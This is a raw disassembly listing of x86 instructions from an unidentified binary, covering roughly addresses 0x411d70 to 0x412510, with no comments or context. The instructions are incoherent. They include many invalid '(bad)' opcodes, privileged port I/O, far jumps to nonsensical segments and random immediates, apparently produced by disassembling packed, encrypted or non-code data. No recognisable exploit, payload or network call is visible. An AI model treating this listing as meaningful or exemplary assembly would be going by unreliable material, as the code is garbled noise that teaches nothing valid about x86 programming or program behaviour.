  411d70:	sbb    BYTE PTR [esi+edx*8+0x46],al
  411d74:	xor    ebx,DWORD PTR [eax+0x42]
  411d77:	minps  xmm2,XMMWORD PTR [edi+0x3a]
  411d7b:	adc    DWORD PTR [ebp-0x38],edx
  411d7e:	ins    DWORD PTR es:[edi],dx
  411d7f:	mov    dl,0x52
  411d81:	stos   DWORD PTR es:[edi],eax
  411d82:	push   esi
  411d83:	lods   eax,DWORD PTR ds:[esi]
  411d84:	lods   al,BYTE PTR ds:[esi]
  411d85:	ja     0x411d2c
  411d87:	push   esi
  411d88:	or     esi,eax
  411d8a:	adc    eax,0x118bc789
  411d8f:	push   edi
  411d90:	cmc    
  411d91:	pop    ds
  411d92:	mov    ebx,0xcea66357
  411d97:	pusha  
  411d98:	shr    DWORD PTR [ecx-0x59],cl
  411d9b:	loope  0x411e11
  411d9d:	cs sub ecx,0xf4220f62
  411da4:	mov    ch,0xaa
  411da6:	push   ds
  411da7:	in     eax,0xbd
  411da9:	jecxz  0x411d92
  411dab:	cli    
  411dac:	pop    eax
  411dad:	mov    ds:0x9ba931e4,al
  411db2:	xchg   edx,eax
  411db3:	xchg   BYTE PTR [edx],bh
  411db5:	push   eax
  411db6:	adc    eax,0x2c7445fb
  411dbb:	js     0x411e0a
  411dbd:	push   edx
  411dbe:	sub    al,0xd7
  411dc0:	xor    eax,esi
  411dc2:	xor    edx,0x28
  411dc5:	jl     0x411d9c
  411dc7:	sbb    eax,0x2cb51054
  411dcc:	cli    
  411dcd:	sub    dl,al
  411dcf:	mov    ds:0x269af467,eax
  411dd4:	jbe    0x411e26
  411dd6:	mov    eax,0x926ab4f3
  411ddb:	xor    edx,DWORD PTR [edx-0x9]
  411dde:	xchg   edi,eax
  411ddf:	xchg   ecx,eax
  411de0:	lea    ebx,[eax+0x1ffbf97]
  411de6:	pushf  
  411de7:	xchg   ebp,eax
  411de8:	(bad)  
  411de9:	jmp    0xc6d1a686
  411dee:	retf   
  411def:	lahf   
  411df0:	pop    esp
  411df1:	cmp    al,0x28
  411df3:	xchg   esi,eax
  411df4:	xchg   bl,ah
  411df6:	cmp    eax,0xe6cbb6f0
  411dfb:	or     BYTE PTR [ebp+0x20],0x23
  411dff:	popa   
  411e00:	cld    
  411e01:	jns    0x411e6b
  411e03:	cwde   
  411e04:	mov    edi,0xb37147df
  411e09:	dec    ebp
  411e0a:	push   ds
  411e0b:	adc    cl,BYTE PTR [esi]
  411e0d:	rcr    BYTE PTR [edi-0x60],1
  411e10:	cdq    
  411e11:	call   0xfd001969
  411e16:	jmp    0x411da8
  411e18:	rol    BYTE PTR [ebx],1
  411e1a:	retf   0xe59b
  411e1d:	mov    al,ds:0x3bb4128b
  411e22:	xchg   BYTE PTR [ecx+0x21],bh
  411e25:	popf   
  411e26:	sbb    al,0x46
  411e28:	inc    edi
  411e29:	int    0x5a
  411e2b:	mov    bh,0x21
  411e2d:	rcl    ch,0xd
  411e30:	mov    ecx,0x621e08f4
  411e35:	test   DWORD PTR [esi+0x55],edi
  411e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e39:	or     eax,DWORD PTR [ebx-0xd]
  411e3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e3d:	dec    ecx
  411e3e:	push   ecx
  411e3f:	ds ret 0x78e8
  411e43:	adc    DWORD PTR [esp+ebx*1+0x4b],eax
  411e47:	dec    ebx
  411e48:	or     dl,BYTE PTR [edx]
  411e4a:	addr16 xchg ebx,eax
  411e4c:	outs   dx,DWORD PTR ds:[esi]
  411e4d:	mov    esp,0x3e1d59b
  411e52:	lock pushf 
  411e54:	cmp    DWORD PTR [ecx-0x2f808c3a],edx
  411e5a:	retf   0xb5b5
  411e5d:	adc    ch,BYTE PTR ds:0x349923f4
  411e63:	xor    BYTE PTR [ecx-0x27],bh
  411e66:	pop    esi
  411e67:	in     al,0x2d
  411e69:	cmc    
  411e6a:	repnz pop ds
  411e6c:	jg     0x411e54
  411e6e:	int3   
  411e6f:	shr    BYTE PTR ds:0x167dfafb,1
  411e75:	(bad)  
  411e77:	scas   al,BYTE PTR es:[edi]
  411e78:	sahf   
  411e79:	popa   
  411e7a:	cmp    edi,DWORD PTR [esi+0x36]
  411e7d:	mov    bl,0xef
  411e7f:	add    eax,0x2fce64df
  411e84:	ret    
  411e85:	xchg   ebp,eax
  411e86:	call   0x12909ad3
  411e8b:	test   bl,al
  411e8d:	(bad)  
  411e8e:	sbb    ah,BYTE PTR [ebp+eax*1+0x66ad6614]
  411e95:	dec    ebp
  411e96:	or     ch,al
  411e98:	fcmovbe st,st(0)
  411e9a:	lds    ebx,FWORD PTR [edx+ecx*4-0x472d76f0]
  411ea1:	pop    ecx
  411ea2:	int3   
  411ea3:	cli    
  411ea4:	add    ebp,DWORD PTR [edi+edi*1]
  411ea7:	pop    ebp
  411ea8:	fwait
  411ea9:	xor    eax,0x9ac9c515
  411eae:	mov    ebx,0x758555a4
  411eb3:	in     al,0x98
  411eb5:	lods   al,BYTE PTR ds:[esi]
  411eb6:	leave  
  411eb7:	fcom   QWORD PTR [edx]
  411eb9:	push   0x2f1af022
  411ebe:	popf   
  411ebf:	xchg   ebx,ebx
  411ec1:	daa    
  411ec2:	pop    eax
  411ec3:	mov    ecx,es
  411ec5:	arpl   WORD PTR [edx],bx
  411ec7:	push   ss
  411ec8:	gs js  0x411ef8
  411ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ecc:	imul   ebp,DWORD PTR [ebp+edi*4-0x4a2e2fc0],0xffffffcc
  411ed4:	dec    ecx
  411ed5:	mov    ecx,0x3db416c7
  411eda:	mov    ah,0x47
  411edc:	cmp    edi,0xffffff9f
  411edf:	out    dx,al
  411ee0:	mov    gs,WORD PTR [esi+ebp*1+0x9]
  411ee4:	xchg   esp,edx
  411ee6:	sbb    BYTE PTR [edi+0x66],0xae
  411eea:	(bad)  
  411eeb:	mov    cl,0x34
  411eed:	pop    es
  411eee:	push   eax
  411eef:	nop
  411ef0:	repz (bad) 
  411ef3:	test   dh,ah
  411ef5:	xor    al,BYTE PTR [ecx+0x46b9013b]
  411efb:	scas   eax,DWORD PTR es:[edi]
  411efc:	sbb    bl,BYTE PTR [ebp+ebx*2+0x4c]
  411f00:	cmp    eax,0xd8639145
  411f05:	(bad)  
  411f06:	sti    
  411f07:	xchg   DWORD PTR [esi-0x7bfef470],esi
  411f0d:	and    edx,0x95133832
  411f13:	sbb    dl,BYTE PTR [eax+0x523e7089]
  411f19:	xor    DWORD PTR [edx-0x39],0xffffffe1
  411f1d:	mov    eax,ds:0xc4f48cf2
  411f22:	les    ebp,FWORD PTR [edi-0x3b46068b]
  411f28:	fwait
  411f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f2a:	retf   
  411f2b:	push   0xa25ce05e
  411f30:	in     eax,dx
  411f31:	inc    esi
  411f32:	mov    DWORD PTR [esi+edi*1-0x4d],ebx
  411f36:	push   esi
  411f37:	sbb    al,0x55
  411f39:	call   0x4ce:0xcee0493a
  411f40:	js     0x411f83
  411f42:	loop   0x411fbb
  411f44:	inc    esp
  411f45:	sbb    eax,0xdc98f550
  411f4a:	xchg   edx,eax
  411f4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f4c:	out    dx,al
  411f4d:	xchg   ecx,eax
  411f4e:	dec    ebx
  411f4f:	push   eax
  411f50:	xchg   ecx,eax
  411f51:	or     DWORD PTR [edx+0x52],ebp
  411f54:	cs pop es
  411f56:	addr16 (bad) 
  411f58:	adc    bh,ah
  411f5a:	pop    ebp
  411f5b:	fldcw  WORD PTR [esi+0x33]
  411f5e:	jns    0x411fd0
  411f60:	(bad)  
  411f61:	fadd   QWORD PTR [ecx+eax*1+0x17570945]
  411f68:	inc    ebx
  411f69:	fsubr  DWORD PTR [esi]
  411f6b:	mov    WORD PTR [ebp+edx*2-0x7076e070],ds
  411f72:	ss js  0x411f1b
  411f75:	mov    esi,0x5c554e4c
  411f7a:	cwde   
  411f7b:	sahf   
  411f7c:	xchg   ebx,eax
  411f7d:	loope  0x411f18
  411f7f:	das    
  411f80:	fadd   QWORD PTR [esi+0x70]
  411f83:	jo     0x411f93
  411f85:	xchg   DWORD PTR [edi],esi
  411f87:	push   cs
  411f88:	retf   
  411f89:	dec    esp
  411f8a:	xlat   BYTE PTR ds:[ebx]
  411f8b:	pop    ecx
  411f8c:	ss jg  0x411f71
  411f8f:	pop    ss
  411f90:	fadd   st,st(6)
  411f92:	jbe    0x411fba
  411f94:	and    edi,edi
  411f96:	adc    ebp,DWORD PTR [esi+edx*2]
  411f99:	leave  
  411f9a:	inc    ecx
  411f9b:	pop    edi
  411f9c:	mov    al,ds:0x9042b2a2
  411fa1:	scas   eax,DWORD PTR es:[edi]
  411fa2:	cli    
  411fa3:	jo     0x411f85
  411fa5:	rep lods al,BYTE PTR ds:[esi]
  411fa7:	leave  
  411fa8:	jnp    0x411f3c
  411faa:	or     al,0x41
  411fac:	paddsw mm0,mm5
  411faf:	jb     0x411fd5
  411fb1:	popa   
  411fb2:	leave  
  411fb3:	(bad)  [eax]
  411fb5:	sbb    ebx,DWORD PTR [esi-0x77]
  411fb8:	dec    ebp
  411fb9:	outs   dx,BYTE PTR ds:[esi]
  411fba:	jo     0x411f42
  411fbc:	dec    eax
  411fbd:	test   eax,0x4c89437
  411fc2:	mov    ebp,0x4734c049
  411fc7:	retf   0x6b8b
  411fca:	inc    ecx
  411fcb:	lock fimul DWORD PTR [ebx+esi*4]
  411fcf:	or     BYTE PTR [eax],ah
  411fd1:	fld    QWORD PTR [edx+esi*1]
  411fd4:	into   
  411fd5:	shl    esi,1
  411fd7:	cld    
  411fd8:	xchg   BYTE PTR [edi+0xbc14693],ah
  411fde:	xchg   esi,eax
  411fdf:	sub    al,0xc
  411fe1:	mov    dh,0xf8
  411fe3:	push   edx
  411fe4:	push   ss
  411fe5:	cld    
  411fe6:	inc    edi
  411fe7:	dec    esi
  411fe8:	pop    edx
  411fe9:	ja     0x41202c
  411feb:	(bad)  
  411fec:	sbb    eax,0x67f81ee
  411ff1:	and    esp,ebx
  411ff3:	mov    ds:0x664074bb,eax
  411ff8:	mov    eax,0xd28a8be9
  411ffd:	into   
  411ffe:	and    eax,DWORD PTR [eax+0x72]
  412001:	and    al,0x94
  412003:	mov    esi,0x9d4c6475
  412008:	int3   
  412009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41200a:	xchg   esi,esi
  41200c:	pusha  
  41200d:	cli    
  41200e:	test   DWORD PTR [edx],edx
  412010:	adc    BYTE PTR [ebp-0x5],0xae
  412014:	and    edx,DWORD PTR [edi+0x4b]
  412017:	or     eax,0x498e8f41
  41201c:	mov    dl,0x80
  41201e:	dec    ebp
  41201f:	push   cs
  412020:	pop    esi
  412021:	mov    bl,0x9c
  412023:	es mov dl,0x6a
  412026:	fcom   DWORD PTR [ebp+esi*8-0x19]
  41202a:	int3   
  41202b:	mov    esp,esi
  41202d:	clc    
  41202e:	addr16 mov cl,0x9
  412031:	jmp    0x74fd:0x606cb98
  412038:	mov    ebx,0xbb3a817c
  41203d:	lods   al,BYTE PTR ds:[esi]
  41203e:	(bad)  
  41203f:	sub    al,0x82
  412041:	sti    
  412042:	lods   eax,DWORD PTR ds:[esi]
  412043:	jmp    0x412009
  412045:	inc    ebp
  412046:	fisttp DWORD PTR [edx-0x7c]
  412049:	lea    eax,[edx-0x4c69cc6]
  41204f:	shl    BYTE PTR [edi-0x7bd320d5],0x42
  412056:	and    eax,DWORD PTR [ecx-0x77]
  412059:	(bad)  
  41205a:	jg     0x412031
  41205c:	scas   eax,DWORD PTR es:[edi]
  41205d:	cmp    al,0xc4
  41205f:	stc    
  412060:	in     eax,0xd
  412062:	inc    ebx
  412063:	pop    es
  412064:	daa    
  412065:	adc    WORD PTR [esi],si
  412068:	lea    eax,[eax-0x1fe1ea53]
  41206e:	or     DWORD PTR [ecx],esp
  412070:	jbe    0x412008
  412072:	into   
  412073:	das    
  412074:	popa   
  412075:	adc    eax,0xdaeaf75c
  41207a:	lods   al,BYTE PTR ds:[esi]
  41207b:	add    eax,DWORD PTR [edx]
  41207d:	out    dx,al
  41207e:	dec    eax
  41207f:	sub    bh,BYTE PTR [ecx+0x10b5e96b]
  412085:	pop    ecx
  412086:	xchg   ecx,eax
  412087:	xchg   ebp,eax
  412088:	push   es
  412089:	in     al,0xa2
  41208b:	xor    al,0x5f
  41208d:	fwait
  41208e:	jmp    0xe7edf7d0
  412093:	push   ecx
  412094:	outs   dx,BYTE PTR ds:[esi]
  412095:	out    0x79,eax
  412097:	fldpi  
  412099:	lock nop
  41209b:	stc    
  41209c:	inc    eax
  41209d:	cld    
  41209e:	(bad)  
  41209f:	rcr    BYTE PTR [edi+0x51d1eeea],1
  4120a5:	bound  edx,QWORD PTR ds:0x9085e11
  4120ab:	jne    0x4120b7
  4120ad:	mov    fs,WORD PTR [ebp+0x5cc3fc41]
  4120b3:	jae    0x41205a
  4120b5:	ins    BYTE PTR es:[edi],dx
  4120b6:	nop
  4120b7:	test   DWORD PTR [edi],eax
  4120b9:	cmp    DWORD PTR [eax-0x4d],ecx
  4120bc:	pop    ss
  4120bd:	je     0x412083
  4120bf:	clc    
  4120c0:	jecxz  0x4120ec
  4120c2:	lock popf 
  4120c4:	cdq    
  4120c5:	sub    DWORD PTR [edi-0x45d637f6],ebp
  4120cb:	daa    
  4120cc:	aas    
  4120cd:	mov    BYTE PTR [ebx+0x6e],dl
  4120d0:	retf   0xa3a7
  4120d3:	xor    edx,DWORD PTR [eax+0xa8273c1]
  4120d9:	es repnz cwde 
  4120dc:	nop
  4120dd:	and    al,0xb1
  4120df:	xor    eax,0x2b3c42f3
  4120e4:	push   esi
  4120e5:	and    eax,0x61a07c37
  4120ea:	xor    DWORD PTR [ecx],esp
  4120ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120ed:	cli    
  4120ee:	pop    ss
  4120ef:	fnstenv [esi]
  4120f1:	sbb    al,BYTE PTR [ebp+0x30]
  4120f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f5:	fwait
  4120f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120f7:	sbb    edi,0xffffffc2
  4120fa:	ret    0x2839
  4120fd:	xor    ecx,DWORD PTR [esi+0x5f]
  412100:	lods   eax,DWORD PTR ds:[esi]
  412101:	xor    eax,0x3964d54d
  412106:	adc    DWORD PTR [ecx-0x40211a57],ecx
  41210c:	ins    DWORD PTR es:[edi],dx
  41210d:	push   esi
  41210e:	imul   edi,DWORD PTR [ecx+0x69ea9635],0xaf1fc91a
  412118:	lahf   
  412119:	(bad)  
  41211a:	out    dx,eax
  41211b:	test   DWORD PTR [edi+0x54],ebx
  41211e:	cld    
  41211f:	push   0x1f
  412121:	sub    ch,BYTE PTR [esi+0x456a4ce1]
  412127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412128:	pop    esp
  412129:	inc    ecx
  41212a:	push   esi
  41212b:	jl     0x412185
  41212d:	adc    eax,0x919e1ea8
  412132:	add    eax,0x2b9d6354
  412137:	push   ebp
  412138:	test   eax,0xa62e8ea1
  41213d:	lods   eax,DWORD PTR ds:[esi]
  41213e:	sub    eax,0x1301734b
  412143:	mov    edi,0xe0a3d35d
  412148:	stos   DWORD PTR es:[edi],eax
  412149:	call   FWORD PTR [esi-0x518c0421]
  41214f:	pop    edi
  412150:	frstor [ebx+0x21]
  412153:	in     al,dx
  412154:	add    eax,0x14223be2
  412159:	shl    bl,0x6e
  41215c:	pushf  
  41215d:	inc    ebp
  41215e:	and    cl,BYTE PTR [edx-0x7c949927]
  412164:	jmp    0x41211d
  412166:	jmp    0xf5b2:0x4fa910b1
  41216d:	rcr    BYTE PTR [edx+ebx*1-0x8859903],cl
  412174:	xchg   edi,eax
  412175:	mov    DWORD PTR [ecx+0x2c9a1901],eax
  41217b:	inc    esi
  41217c:	aad    0xfd
  41217e:	js     0x412157
  412180:	push   ecx
  412181:	add    eax,0x5119066a
  412186:	adc    al,0x72
  412188:	je     0x4121b6
  41218a:	mov    DWORD PTR [eax-0x7d],ecx
  41218d:	push   esp
  41218e:	push   esi
  41218f:	mov    ebp,0xb8f1d789
  412194:	adc    BYTE PTR [ebx-0x80],bl
  412197:	and    BYTE PTR [edx+0x5b],bl
  41219a:	frstor [edi-0x36]
  41219d:	les    edi,FWORD PTR [edx-0x3f2f6002]
  4121a3:	jnp    0x4121e4
  4121a5:	push   esi
  4121a6:	add    ch,BYTE PTR [ecx-0x60a7010a]
  4121ac:	arpl   bp,si
  4121ae:	mov    cl,0x6c
  4121b0:	iret   
  4121b1:	repz imul eax,DWORD PTR [edx+edi*8-0x4d],0xffffff94
  4121b7:	and    al,0x29
  4121b9:	lds    ebp,FWORD PTR [ecx+0x52188ce1]
  4121bf:	out    0xdb,eax
  4121c1:	repnz pop esi
  4121c3:	push   esi
  4121c4:	push   ebx
  4121c5:	leave  
  4121c6:	dec    eax
  4121c7:	xchg   cl,ch
  4121c9:	sub    al,0xa7
  4121cb:	lods   eax,DWORD PTR ds:[esi]
  4121cc:	aaa    
  4121cd:	hlt    
  4121ce:	sub    cl,BYTE PTR [edx-0x8]
  4121d1:	xchg   DWORD PTR [eax],eax
  4121d3:	add    eax,0x2b810ca6
  4121d8:	jnp    0x412163
  4121da:	mov    edx,0xcd456e4f
  4121df:	inc    edi
  4121e0:	mov    DWORD PTR [edi+0xd],edx
  4121e3:	dec    ecx
  4121e4:	dec    esp
  4121e5:	mov    bl,0x88
  4121e7:	repz add DWORD PTR [esi+0x48],eax
  4121eb:	pop    ebp
  4121ec:	mov    cl,0xce
  4121ee:	add    ebx,ecx
  4121f0:	ins    DWORD PTR es:[edi],dx
  4121f1:	mov    al,BYTE PTR [ecx-0x628c9758]
  4121f7:	arpl   WORD PTR [esi-0x7cada7db],di
  4121fd:	mov    al,dl
  4121ff:	pop    edx
  412200:	(bad)  
  412201:	and    DWORD PTR [esi+edx*1-0x3c6c1b40],ecx
  412208:	pop    ds
  412209:	or     BYTE PTR [ecx+0x7],dl
  41220c:	add    BYTE PTR [edi+0x316aef7c],ch
  412212:	pop    edi
  412213:	mov    eax,es
  412215:	pop    eax
  412216:	push   cs
  412217:	retf   0xd6cd
  41221a:	sub    ebx,DWORD PTR [ebx]
  41221c:	shr    ebx,1
  41221e:	push   es
  41221f:	add    DWORD PTR [edi],ebx
  412221:	cmp    eax,0x8d3d562f
  412226:	jmp    0x41226b
  412228:	xor    al,0xa5
  41222a:	cmp    al,0xba
  41222c:	jns    0x4121b0
  41222e:	jo     0x412279
  412230:	inc    edi
  412231:	mov    ah,0x2d
  412233:	xchg   ebx,eax
  412234:	dec    eax
  412235:	add    ch,BYTE PTR [eax]
  412237:	(bad)  
  412238:	xor    eax,0x82a32d18
  41223d:	dec    edi
  41223e:	jne    0x4121f7
  412240:	retf   0x81ee
  412243:	jnp    0x996fa2a4
  412249:	fldcw  WORD PTR [ecx]
  41224b:	inc    edi
  41224c:	(bad)
  41224f:	cmp    cl,cl
  412251:	sub    eax,0x281981d6
  412256:	iret   
  412257:	das    
  412258:	or     DWORD PTR [esi],ebx
  41225a:	sub    BYTE PTR [edx],al
  41225c:	mov    eax,0xe732d53f
  412261:	ffree  st(7)
  412263:	jnp    0x41226e
  412265:	inc    esi
  412266:	shr    DWORD PTR ds:0x41a69a6a,1
  41226c:	jne    0x41220a
  41226e:	mov    ds:0x6e7914e7,al
  412273:	lea    eax,[ebx+edi*4]
  412276:	xor    esi,edx
  412278:	push   ebp
  412279:	sub    edx,DWORD PTR ds:0xef156eeb
  41227f:	mov    edx,0x5df2ce54
  412284:	sar    BYTE PTR [ebp+0x61],cl
  412287:	jle    0x41226d
  412289:	ss and al,bh
  41228c:	repz fs pop esi
  41228f:	out    0x8,eax
  412291:	xchg   ecx,eax
  412292:	xor    dl,BYTE PTR [esi+0x7028a673]
  412298:	mov    ah,0x64
  41229a:	dec    ebp
  41229b:	je     0x4122eb
  41229d:	sbb    DWORD PTR [eax+0x7b],edi
  4122a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122a1:	ja     0x4122ee
  4122a3:	pop    es
  4122a4:	inc    edi
  4122a5:	js     0x4122c1
  4122a7:	xchg   ebx,eax
  4122a8:	cs xchg edi,eax
  4122aa:	inc    ebx
  4122ab:	push   ebx
  4122ac:	(bad)  
  4122ad:	in     al,0x7
  4122af:	(bad)  
  4122b0:	outs   dx,BYTE PTR ds:[esi]
  4122b1:	dec    esp
  4122b2:	fist   DWORD PTR [edx+0x27]
  4122b5:	cmp    DWORD PTR [edx-0x49],0xfffffff9
  4122b9:	test   al,0x67
  4122bb:	push   es
  4122bc:	popf   
  4122bd:	stc    
  4122be:	push   eax
  4122bf:	nop
  4122c0:	dec    esi
  4122c1:	or     esi,0x24fc10ce
  4122c7:	outs   dx,BYTE PTR ds:[esi]
  4122c8:	clc    
  4122c9:	mov    al,0xdc
  4122cb:	(bad)  
  4122cd:	adc    BYTE PTR [esi],dl
  4122cf:	add    DWORD PTR [ebx-0x2f992ad],eax
  4122d5:	stos   DWORD PTR es:[edi],eax
  4122d6:	lahf   
  4122d7:	and    bh,BYTE PTR [edx-0x1c5f960]
  4122dd:	push   ebp
  4122de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122df:	shl    DWORD PTR [edi-0x10],cl
  4122e2:	dec    ebp
  4122e3:	loope  0x41226e
  4122e5:	pop    ds
  4122e6:	in     al,0xa7
  4122e8:	inc    ebp
  4122e9:	pop    es
  4122ea:	push   eax
  4122eb:	jae    0x41234b
  4122ed:	jle    0x41227d
  4122ef:	jmp    0x412334
  4122f1:	mov    dh,0xbb
  4122f3:	push   eax
  4122f4:	shr    esi,1
  4122f6:	cmp    eax,0xaa534d03
  4122fb:	icebp  
  4122fc:	mov    bl,0x19
  4122fe:	shr    DWORD PTR [ebp+edi*8-0x7afb531d],cl
  412305:	sar    DWORD PTR [esi-0x6feb36c9],cl
  41230b:	in     al,dx
  41230c:	in     al,0xe5
  41230e:	pop    eax
  41230f:	adc    eax,DWORD PTR ds:0xe04fa9f3
  412315:	mov    dl,0x42
  412317:	(bad)
  41231a:	aaa    
  41231b:	mov    ebx,0x69490cf7
  412320:	inc    esp
  412321:	cmc    
  412322:	std    
  412323:	faddp  st(0),st
  412325:	mov    ds:0x72cdac65,eax
  41232a:	jb     0x41235e
  41232c:	gs dec esi
  41232e:	dec    BYTE PTR [ebx+0x31fb3246]
  412334:	repnz cmp al,0x7c
  412337:	repnz inc edx
  412339:	push   esi
  41233a:	pop    esi
  41233b:	aas    
  41233c:	fisubr DWORD PTR [eax+eax*4+0x3]
  412340:	add    ebp,DWORD PTR [eax]
  412342:	jle    0x412383
  412344:	mov    ds:0x9de4ca73,al
  412349:	cmp    BYTE PTR [edi+0x6b98890d],0x64
  412350:	shl    esp,0x4f
  412353:	in     al,0x23
  412355:	call   0x4b81:0x4174d612
  41235c:	dec    esp
  41235d:	fdiv   QWORD PTR [ecx-0x42aa8803]
  412363:	jns    0x412314
  412365:	mov    bl,bh
  412367:	test   ebp,eax
  412369:	or     ebx,ebp
  41236b:	or     dl,BYTE PTR [ebp-0xc354363]
  412371:	jge    0x41239b
  412373:	ret    0xab77
  412376:	cmp    DWORD PTR [edi-0x2d],edi
  412379:	sbb    DWORD PTR [edi+eax*1-0x2d],edi
  41237d:	icebp  
  41237e:	clc    
  41237f:	push   ebx
  412380:	aas    
  412381:	imul   esp,DWORD PTR [edi+0x43c5f8c1],0xffffff90
  412388:	mov    esp,DWORD PTR [edi-0x51b0ad70]
  41238e:	outs   dx,BYTE PTR ds:[esi]
  41238f:	or     DWORD PTR [eax+0x35],0x6a3934c
  412396:	dec    DWORD PTR [ecx-0x4f5c5132]
  41239c:	js     0x4123ee
  41239e:	pop    es
  41239f:	xchg   edx,eax
  4123a0:	call   0x269f1ca5
  4123a5:	out    0x8a,eax
  4123a7:	in     eax,dx
  4123a8:	xchg   ebp,eax
  4123a9:	shl    DWORD PTR [ebx+ecx*1+0x10ea3f18],cl
  4123b0:	sub    al,0xea
  4123b2:	ret    0x7350
  4123b5:	gs int3 
  4123b7:	(bad)  
  4123b8:	test   al,0xa5
  4123ba:	cmp    DWORD PTR [edi+0x1],eax
  4123bd:	add    eax,ecx
  4123bf:	mov    ch,0x68
  4123c1:	push   ecx
  4123c2:	out    0x97,al
  4123c4:	pop    ebx
  4123c5:	jge    0x412426
  4123c7:	shl    BYTE PTR [edi],cl
  4123c9:	push   eax
  4123ca:	jo     0x412446
  4123cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123cd:	inc    dh
  4123cf:	aaa    
  4123d0:	dec    BYTE PTR [ebx+esi*2+0x46313859]
  4123d7:	cmp    ebp,eax
  4123d9:	int3   
  4123da:	jno    0x4123a2
  4123dc:	mov    al,0x87
  4123de:	sar    DWORD PTR [edx],0x17
  4123e1:	(bad)  
  4123e2:	mov    ss,WORD PTR [ebx+0x1d52dd02]
  4123e8:	jecxz  0x412420
  4123ea:	fnstenv [esi+0x72ff6d57]
  4123f0:	cmc    
  4123f1:	push   edx
  4123f2:	xor    esi,0x743b8089
  4123f8:	(bad)  
  4123f9:	popa   
  4123fa:	xchg   DWORD PTR [ebx+0x4a],edi
  4123fd:	(bad)  
  4123fe:	mov    ah,0xb0
  412400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412401:	jmp    0x412443
  412403:	cmp    ah,al
  412405:	dec    esi
  412406:	jle    0x412419
  412408:	nop
  412409:	lds    eax,FWORD PTR [eax-0xa]
  41240c:	stc    
  41240d:	push   cs
  41240e:	jmp    0xfee7:0xc7b7e91b
  412415:	popa   
  412416:	xchg   edi,eax
  412417:	add    eax,DWORD PTR [ecx+0x3d]
  41241a:	ins    BYTE PTR es:[edi],dx
  41241b:	xor    eax,0x8e591d5
  412420:	out    0xcc,al
  412422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412423:	jg     0x4123f5
  412425:	mov    ?,WORD PTR [ecx+0x3dc7f849]
  41242b:	mov    ds:0x60f35194,al
  412430:	mov    cl,0x27
  412432:	push   ds
  412433:	push   edi
  412434:	push   ecx
  412435:	jmp    0xb38f:0xc6375f15
  41243c:	stos   DWORD PTR es:[edi],eax
  41243d:	xchg   edx,eax
  41243e:	int3   
  41243f:	outs   dx,DWORD PTR ds:[esi]
  412440:	scas   eax,DWORD PTR es:[edi]
  412441:	dec    edx
  412442:	mov    ds:0xeec89e05,al
  412447:	cmp    cl,BYTE PTR [eax+0x348879c4]
  41244d:	mov    al,ds:0xcf74a3c7
  412452:	fisttp QWORD PTR [esi+esi*1]
  412455:	mov    cl,0x31
  412457:	inc    esp
  412458:	pop    ebp
  412459:	pop    esp
  41245a:	fidivr WORD PTR [esp+ebp*8]
  41245d:	xor    edi,esi
  41245f:	xchg   dl,bh
  412461:	leave  
  412462:	push   0xe
  412464:	not    BYTE PTR [ecx+0x8302d]
  41246a:	loop   0x4124b2
  41246c:	test   BYTE PTR [ecx-0x5236bcb8],dl
  412472:	sbb    BYTE PTR [edx-0x63],al
  412475:	sbb    dl,BYTE PTR [eax-0x7a]
  412478:	xor    bh,ah
  41247a:	xchg   BYTE PTR [ebp-0x2b],ah
  41247d:	je     0x4124e5
  41247f:	(bad)  
  412480:	nop
  412481:	xor    bh,BYTE PTR [ecx]
  412483:	mov    ebx,0x28dd6276
  412488:	jno    0x412507
  41248a:	pop    edi
  41248b:	js     0x412486
  41248d:	fbld   TBYTE PTR [ebx+0x7f]
  412490:	retf   
  412491:	(bad)  
  412492:	iret   
  412493:	aam    0x5e
  412495:	or     ecx,DWORD PTR [ecx-0x6be76a6c]
  41249b:	call   0x83a1e46b
  4124a0:	shl    BYTE PTR [esi],cl
  4124a2:	int3   
  4124a3:	stc    
  4124a4:	xor    bl,BYTE PTR [ecx-0x65]
  4124a7:	push   esp
  4124a8:	daa    
  4124a9:	push   ecx
  4124aa:	adc    al,0x8
  4124ac:	outs   dx,BYTE PTR ds:[esi]
  4124ad:	xchg   esp,eax
  4124ae:	jmp    eax
  4124b0:	xchg   BYTE PTR [esi+0x160a7ca],cl
  4124b6:	aad    0x7a
  4124b8:	arpl   WORD PTR [ebp+0x1c646731],di
  4124be:	jmp    0x4124a8
  4124c0:	cmp    al,0x68
  4124c2:	pop    ebp
  4124c3:	xchg   ebx,eax
  4124c4:	out    0xc7,al
  4124c6:	cmp    cl,bh
  4124c8:	in     eax,0x97
  4124ca:	adc    eax,0xfdbc4718
  4124cf:	inc    esp
  4124d0:	xor    DWORD PTR [ebx+0x72f7a534],edi
  4124d6:	jnp    0x412511
  4124d8:	push   ecx
  4124d9:	test   al,bh
  4124db:	paddq  mm1,QWORD PTR [esp+edi*8-0x37]
  4124e0:	int    0x21
  4124e2:	es cmp esi,eax
  4124e5:	pop    es
  4124e6:	jbe    0x41252f
  4124e8:	xchg   DWORD PTR [edi],ecx
  4124ea:	push   eax
  4124eb:	test   BYTE PTR [edi],bh
  4124ed:	mov    esi,eax
  4124ef:	and    dl,BYTE PTR [esi+0x7fffb53d]
  4124f5:	xor    edi,DWORD PTR ds:0xc47f0be1
  4124fb:	mov    dh,0x51
  4124fd:	jle    0x412556
  4124ff:	scas   eax,DWORD PTR es:[edi]
  412500:	lock xor edi,0x35eae968
  412507:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412508:	popa   
  412509:	jno    0x41250d
  41250b:	loop   0x4124ba
  41250d:	ins    DWORD PTR es:[edi],dx
  41250e:	int    0x28
  412510:	xor    ebx,ebx
